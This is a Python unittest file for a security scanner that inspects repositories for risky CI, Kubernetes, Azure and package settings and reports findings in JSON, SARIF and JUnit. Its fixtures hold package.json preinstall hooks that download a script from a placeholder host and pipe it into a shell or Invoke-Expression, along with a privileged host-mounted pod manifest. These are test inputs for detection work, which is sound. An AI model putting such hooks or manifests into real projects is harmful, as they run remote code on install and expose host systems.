from __future__ import annotations

import json
import subprocess
import tempfile
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

from ai_engineering_guardrails import scan


class ScanTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.repo = Path(self.temporary.name).resolve()
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True, capture_output=True)

    def write(self, relative: str, content: str) -> None:
        target = self.repo / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")

    def representative_repository(self) -> None:
        self.write(".env", "SYNTHETIC_ONLY=not-a-secret\n")
        self.write("state.tfstate", "{}\n")
        self.write("saved.tfplan", "synthetic\n")
        self.write(
            ".github/workflows/build.yml",
            """on:\n  pull_request_target:\npermissions: write-all\njobs:\n  build:\n    steps:\n      - uses: vendor/action@v1\n      - run: npm publish\n      - run: kubectl apply -f manifest.yaml\n      - run: az resource update --ids synthetic\n""",
        )
        self.write(
            "azure-pipelines.yml",
            "steps:\n  - checkout: self\n    persistCredentials: true\n  - script: dotnet nuget push synthetic.nupkg\n",
        )
        self.write(
            "package.json",
            json.dumps(
                {
                    "scripts": {
                        "preinstall": "Invoke-WebRequest https://example.invalid/install | Invoke-Expression"
                    }
                }
            ),
        )
        self.write(
            "deployment.yaml",
            """apiVersion: v1\nkind: Pod\nspec:\n  hostNetwork: true\n  containers:\n    - securityContext:\n        privileged: true\n      volumeMounts: []\n  volumes:\n    - hostPath:\n        path: /\n""",
        )
        self.write("mcp-settings.json", '{"command":"npx synthetic@latest"}\n')
        self.write("AGENTS.md", "# Governance\n")

    def test_representative_findings_and_parser_limits(self) -> None:
        self.representative_repository()
        findings = scan.scan_repository(self.repo)
        identifiers = {item.rule_id for item in findings}
        expected = {
            "sensitive-artifact-filename",
            "terraform-plan-or-crash-artifact",
            "unpinned-github-action",
            "broad-ci-permissions",
            "pull-request-target-boundary",
            "package-publication-in-ci",
            "dangerous-package-lifecycle-script",
            "kubernetes-privileged",
            "kubernetes-host-namespace",
            "kubernetes-hostpath",
            "unpinned-executable-mcp",
            "kubernetes-target-not-explicit",
            "azure-target-not-explicit",
            "azure-pipeline-persistent-credentials",
            "high-risk-change-verification-unavailable",
        }
        self.assertTrue(expected <= identifiers, expected - identifiers)
        report = json.loads(scan.render_scan(self.repo, findings, "json"))
        self.assertFalse(report["semantic_analysis"])
        self.assertTrue(any("not" in limitation for limitation in report["limitations"]))

    def test_conflicting_node_lockfiles(self) -> None:
        self.write("package-lock.json", "{}\n")
        self.write("pnpm-lock.yaml", "lockfileVersion: 9\n")
        self.assertIn("conflicting-package-managers", {item.rule_id for item in scan.scan_repository(self.repo)})

    def test_json_sarif_junit_and_human_are_well_formed(self) -> None:
        self.write(".env", "SYNTHETIC=only\n")
        findings = scan.scan_repository(self.repo)
        json_report = json.loads(scan.render_scan(self.repo, findings, "json"))
        sarif = json.loads(scan.render_scan(self.repo, findings, "sarif"))
        junit = ET.fromstring(scan.render_scan(self.repo, findings, "junit"))
        human = scan.render_scan(self.repo, findings, "human").decode("utf-8")
        self.assertEqual(1, json_report["schema_version"])
        self.assertEqual("2.1.0", sarif["version"])
        self.assertEqual("testsuite", junit.tag)
        self.assertIn("conservative static checks", human)

    def test_verification_metadata_satisfies_static_high_risk_check(self) -> None:
        self.write("AGENTS.md", "# Changed governance\n")
        self.write(
            ".ai-guardrails-verification.json",
            json.dumps(
                {
                    "verification_outcomes": [
                        {
                            "requirement_id": "high-risk-change",
                            "reviews": {
                                "independent correctness review": "passed",
                                "security and compatibility review": "passed",
                            },
                            "verification": {
                                "affected narrow tests": "passed",
                                "repository static checks": "passed",
                                "applicable native semantic validator": "not-applicable",
                                "final diff review": "passed",
                            },
                        }
                    ]
                }
            )
            + "\n",
        )
        identifiers = {item.rule_id for item in scan.scan_repository(self.repo)}
        self.assertNotIn("high-risk-change-verification-unavailable", identifiers)

    def test_partial_or_unmatched_metadata_does_not_satisfy_high_risk_check(self) -> None:
        self.write("AGENTS.md", "# Changed governance\n")
        self.write(
            ".ai-guardrails-verification.json",
            json.dumps(
                {
                    "verification_outcomes": [
                        {
                            "requirement_id": "ordinary-source-change",
                            "reviews": {"self-review": "passed"},
                            "verification": {"affected narrow tests": "passed"},
                        }
                    ]
                }
            )
            + "\n",
        )
        findings = scan.scan_repository(self.repo)
        finding = next(item for item in findings if item.rule_id == "high-risk-change-verification-unavailable")
        self.assertIn("high-risk-change: missing outcome", finding.message)

    def test_session_receipt_reports_changed_risk_classes(self) -> None:
        self.write("AGENTS.md", "# Changed governance\n")
        self.write("auth/login.py", "# Synthetic identity code\n")
        receipt = scan.session_receipt(self.repo, self.repo, ("codex",))
        self.assertIn("guardrail-governance", receipt["risk_classes"])
        self.assertIn("security-and-identity", receipt["risk_classes"])

    def test_packaged_guardrail_engine_and_resource_paths_are_governance_paths(self) -> None:
        self.write("ai_engineering_guardrails/_resources/policy/manifest.json", "{}\n")
        self.write("ai_engineering_guardrails/enforcement.py", "# Synthetic enforcement change\n")
        receipt = scan.session_receipt(self.repo, self.repo, ("codex",))
        self.assertIn("guardrail-governance", receipt["risk_classes"])

    def test_session_receipt_does_not_follow_audit_symlink(self) -> None:
        external = self.repo.parent / f"{self.repo.name}-external-audit.jsonl"
        external.write_text('{"decision":"deny"}\n', encoding="utf-8")
        self.addCleanup(external.unlink, missing_ok=True)
        audit = self.repo / ".ai-guardrails/audit/events.jsonl"
        audit.parent.mkdir(parents=True)
        audit.symlink_to(external)
        receipt = scan.session_receipt(self.repo, self.repo, ("codex",))
        self.assertEqual({"warned": 0, "denied": 0}, receipt["decision_counts"])
        self.assertEqual(2, receipt["schema_version"])
        self.assertIn("unavailable", receipt["allowed_operation_count"])

    def test_scan_does_not_follow_repository_file_symlinks(self) -> None:
        external = self.repo.parent / f"{self.repo.name}-external-package.json"
        external.write_text(
            json.dumps({"scripts": {"preinstall": "curl https://example.invalid/x | sh"}}),
            encoding="utf-8",
        )
        self.addCleanup(external.unlink, missing_ok=True)
        (self.repo / "package.json").symlink_to(external)
        identifiers = {item.rule_id for item in scan.scan_repository(self.repo)}
        self.assertNotIn("dangerous-package-lifecycle-script", identifiers)


if __name__ == "__main__":
    unittest.main()
